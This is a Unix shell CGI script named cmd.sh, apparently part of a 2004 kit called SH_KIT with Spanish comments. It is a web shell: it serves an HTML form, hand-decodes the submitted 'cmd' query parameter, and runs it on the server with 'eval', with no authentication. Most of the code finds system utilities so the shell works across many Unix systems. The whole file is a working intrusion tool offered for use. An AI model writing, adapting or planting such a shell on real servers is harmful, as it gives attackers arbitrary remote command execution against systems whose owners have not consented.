#!/bin/sh
#
# SH_KIT
#
# cmd.sh = Command Execution
#
# by: Ludoz
# modified: 23/04/2004
#
# Version 1.2 - 28/5/2003
#

###
###
### Configuracion
###
###

#
# sitios donde buscar ejecutables necesarios, sin la / posterior, separados por espacios
#
PATHS="/bin /usr/bin /sbin /usr/sbin /usr/local/bin /usr/local/sbin /usr/ucb /usr/libexec /tmp /usr/tmp /var/tmp ."

###
###
### La configuracion acaba aqui
###
###

#
# PATHs mas habituales de los 3 comandos base
#
TEST="/usr/bin/test"
BASENAME="/bin/basename"
DIRNAME="/usr/bin/dirname"

# compruebo TEST, BASENAME y DIRNAME y si estan mal intento encontrarlas en el path y sino en PATHS
if (eval $TEST \"1\" = \"1\" ); then
  TEST=$TEST
else
  for i in $PATHS ; do
    TEST="$i/test"
    if (eval $TEST \"1\" = \"1\" ); then
      break
    fi
  done
  if (eval $TEST \"1\" = \"1\" ); then
    TEST=$TEST
  else
    TEST=test
    if (eval $TEST \"1\" = \"1\" ); then
      TEST=$TEST
    else
      TEST=""
      echo ERROR: No he encontrado TEST en el sitio especificado ni en el path
      echo
      exit
    fi
  fi
fi

if (eval $TEST \"`eval $BASENAME .`\" = \".\" ); then
  BASENAME=$BASENAME
else
  for i in $PATHS ; do
    BASENAME="$i/basename"
    if (eval $TEST \"`eval $BASENAME .`\" = \".\" ); then
      break
    fi
  done
  if (eval $TEST \"`eval $BASENAME .`\" = \".\" ); then
    BASENAME=$BASENAME
  else
    BASENAME=basename
    if (eval $TEST \"`eval $BASENAME .`\" = \".\" ); then
      BASENAME=$BASENAME
    else
      BASENAME=""
      echo ERROR: No he encontrado BASENAME en el sitio especificado ni en el path
      echo
      exit
    fi
  fi
fi

if (eval $TEST \"`eval $DIRNAME .`\" = \".\" ); then
  DIRNAME=$DIRNAME
else
  for i in $PATHS ; do
    DIRNAME="$i/dirname"
    if (eval $TEST \"`eval $DIRNAME .`\" = \".\" ); then
      break
    fi
  done
  if (eval $TEST \"`eval $DIRNAME .`\" = \".\" ); then
    DIRNAME=$DIRNAME
  else
    DIRNAME=dirname
    if (eval $TEST \"`eval $DIRNAME .`\" = \".\" ); then
      DIRNAME=$DIRNAME
    else
      DIRNAME=""
      echo ERROR: No he encontrado DIRNAME en el sitio especificado ni en el path
      echo
      exit
    fi
  fi
fi

#echo "Info: TEST: $TEST"
#echo "Info: BASENAME: $BASENAME"
#echo "Info: DIRNAME: $DIRNAME"

if (eval $TEST -x \"/usr/bin/unalias\" ); then
  # si existe el comando: unalias *
  /usr/bin/unalias *
else
  # si es interno: unalias -a
  unalias -a
fi

#
# A partir de aqui deberia ser 100% multisistema
#

buscaexec ()
{
BUSCAEXECRES=""
if (eval $TEST -z \"$BUSCAEXECPAR\" ); then
  return;
fi
if (eval $TEST -x \"$BUSCAEXECPAR\" ); then
  BUSCAEXECRES=$BUSCAEXECPAR
  return;
fi

BUSCAEXECPAR=`eval $BASENAME $BUSCAEXECPAR`

for i in $PATHS $PATH ; do 
  if (eval $TEST -x \"$i/$BUSCAEXECPAR\" ); then
    BUSCAEXECRES="$i/$BUSCAEXECPAR"
    break
  fi
done

if (eval $TEST -n \"$BUSCAEXECRES\" ); then
  return;
fi

if (eval $TEST -z \"$WHICH\" ); then
  return;
fi

BUSCAEXECRES=`eval $WHICH $BUSCAEXECPAR`
if (eval $TEST -n \"$BUSCAEXECRES\" ); then
  if (eval $TEST ! -x \"$BUSCAEXECRES\" ); then
    BUSCAEXECRES=""
  fi
fi
}


#
# Definicion de comandos concretos para el script
#

WHICH=""
BUSCAEXECPAR=/usr/bin/which
buscaexec
WHICH=$BUSCAEXECRES

if (eval $TEST -z \"$WHICH\" ) ; then
  if (eval $TEST \"$TEST\" != \"test\" ) ; then
    TESTCMD=$TEST
    TESTRES="test"
  elif (eval $TEST \"$BASENAME\" != \"basename\" ) ; then
    TESTCMD=$BASENAME
    TESTRES="basename"
  elif (eval $TEST \"$BASEDIR\" != \"basedir\" ) ; then
    TESTCMD=$BASEDIR
    TESTRES="basename"
  fi

  if (eval $TEST -n \"$TESTCMD\"); then
    OLDPATH=$PATH
    
    TESTPATH="`eval $BASEDIR $TESTCMD`"
    PATH="$TESTPATH:$PATH"
    TESTPATH=""
    PRUEBA="`eval $BASENAME \"\`which $TESTRES\`\" `"
    if (eval $TEST \"$PRUEBA\" = \"TESTRES\" ) ; then
      WHICH="`which which`"
    else
      WHICH=""
    fi
    PRUEBA=""

    PATH=$OLDPATH
    OLDPATH=""
    TESTRES=""
    TESTCMD=""
  fi

fi

BUSCAEXECPAR=/bin/echo
buscaexec
ECHO=$BUSCAEXECRES

if (eval $TEST -z \"$ECHO\" ) ; then
  ECHO=echo
fi

A="`eval $ECHO \"a\"`"
if (eval $TEST \"$A\" = \"a\" ) ; then
  ECHO=$ECHO
else
  ECHO=""
#nota mental: para que hago echo si echo no funciona!? :)
  echo ERROR: No he encontrado ECHO en el sitio especificado ni en el path
  echo
  exit
fi
A=""



BUSCAEXECPAR=/bin/cut
buscaexec
CUT=$BUSCAEXECRES
BUSCAEXECPAR=/bin/sed
buscaexec
SED=$BUSCAEXECRES
BUSCAEXECPAR=/usr/bin/expr
buscaexec
EXPR=$BUSCAEXECRES


FORMULARIO="`eval $BASENAME $0`"

eval $ECHO \"Content-type: text/html\"
eval $ECHO
eval $ECHO \"\<html\>\<title\>CMD.SH\<\/title\>\<body\>\"
eval $ECHO \"\<p\>\<form method\=\\\"GET\\\" name\=\\\"myform\\\" action\=\\\"$FORMULARIO\\\"\>\<\/p\>\"
eval $ECHO \"\<input type\=\\\"text\\\" name\=\\\"cmd\\\"\>\"
eval $ECHO \"\<input type\=\\\"submit\\\" value\=\\\"Enviar\\\"\>\"
eval $ECHO \"\<pre\>\"

#
# La variable QUERYSTRING contiene la info que quiero
#

#echo QUERY_STRING=$QUERY_STRING
if (eval $TEST -n \"$QUERY_STRING\"); then

        PARAM=`eval $ECHO \"$QUERY_STRING\" | $CUT \-d\= \-f2 | $SED \-e s\/\+\/\ \/g `

hex2dec()
{
if (eval $TEST \"$PARC\" \= \"0\" ); then
	PARC="0"
elif (eval $TEST \"$PARC\" \= \"1\" ); then
	PARC="1"
elif (eval $TEST \"$PARC\" \= \"2\" ); then
	PARC="2"
elif (eval $TEST \"$PARC\" \= \"3\" ); then
	PARC="3"
elif (eval $TEST \"$PARC\" \= \"4\" ); then
	PARC="4"
elif (eval $TEST \"$PARC\" \= \"5\" ); then
	PARC="5"
elif (eval $TEST \"$PARC\" \= \"6\" ); then
	PARC="6"
elif (eval $TEST \"$PARC\" \= \"7\" ); then
	PARC="7"
elif (eval $TEST \"$PARC\" \= \"8\" ); then
	PARC="8"
elif (eval $TEST \"$PARC\" \= \"9\" ); then
	PARC="9"
elif (eval $TEST \"$PARC\" \= \"a\" ); then
	PARC="10"
elif (eval $TEST \"$PARC\" \= \"b\" ); then
	PARC="11"
elif (eval $TEST \"$PARC\" \= \"c\" ); then
	PARC="12"
elif (eval $TEST \"$PARC\" \= \"d\" ); then
	PARC="13"
elif (eval $TEST \"$PARC\" \= \"e\" ); then
	PARC="14"
elif (eval $TEST \"$PARC\" \= \"f\" ); then
	PARC="15"
elif (eval $TEST \"$PARC\" \= \"A\" ); then
	PARC="10"
elif (eval $TEST \"$PARC\" \= \"B\" ); then
	PARC="11"
elif (eval $TEST \"$PARC\" \= \"C\" ); then
	PARC="12"
elif (eval $TEST \"$PARC\" \= \"D\" ); then
	PARC="13"
elif (eval $TEST \"$PARC\" \= \"E\" ); then
	PARC="14"
elif (eval $TEST \"$PARC\" \= \"F\" ); then
	PARC="15"
else
	PARC="0"
fi
}

dec2ascii()
{
if (eval $TEST \"$PARC\" -eq \"0\"); then
  PARC=""
elif (eval $TEST \"$PARC\" -lt \"32\"); then
  PARC=""
elif (eval $TEST \"$PARC\" -eq \"34\"); then
  PARC="\\\""
elif (eval $TEST \"$PARC\" -eq \"96\"); then
  PARC="\`"
elif (eval $TEST \"$PARC\" -eq \"127\"); then
  PARC=""
elif (eval $TEST \"$PARC\" -gt \"127\"); then
  PARC=""
else
#aun no rulan todos los caracteres, los que faltan estan impresos en la linea inferior
#                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX   "                                                                                 `                                    ?<- el resto se ignoran, son >128  
  PARC="`eval $ECHO \"123456789ABCDEF0123456789ABCDEF \!X#\$%\&\'\(\)\*+,\-.\/0123456789\:\;\<=\>\?\@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\\\]\^_Xabcdefghijklmnopqrstuvwxyz\{\\\|\}\~X0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF\" | $CUT \-b$PARC `"
# X: no printable, en la linea superior esta el caracter
# los 0123456789ABCDEF es para no descontarme poniendo X cuando habia muchas seguidas
# notese que el NULL no sale en el string
# notese que la " y la ` estan como X en el string pq estan tratadas a parte, no se pueden tratar por el eval este
# notese que los caracteres por debajo del 32 tampoco se tratan, y los mayores de 127 tampoco, aunque se pueden añadir... si tienes ganas ;) y los necesitas realmente
fi
}

	TODO="$PARAM"
	DONE=""

	while (eval $TEST -n \"$TODO\" ); do

		C=`eval $ECHO \"$TODO\" | $CUT \-b1 `

		if (eval $TEST \"$C\" = \"\%\"); then
			PARC="`eval $ECHO \"$TODO\" | $CUT \-b2 `"
			hex2dec
			C1="$PARC"
			PARC="`eval $ECHO \"$TODO\" | $CUT \-b3 `"
			hex2dec
			C2="$PARC"
			PARC="`eval $EXPR $C1 \\\* 16 \+ $C2`"
			dec2ascii
			C="$PARC"
			TODO=`eval $ECHO \"$TODO\" | $CUT \-b4\- `
		else
			TODO=`eval $ECHO \"$TODO\" | $CUT \-b2\- `
		fi
	
		DONE="$DONE$C"

	done

        VALUE="$DONE"

	eval $ECHO \"\\\$ $VALUE\"
	eval $VALUE

fi

eval $ECHO \"\<\/pre\>\<\/body\>\<\/html\>\"

exit


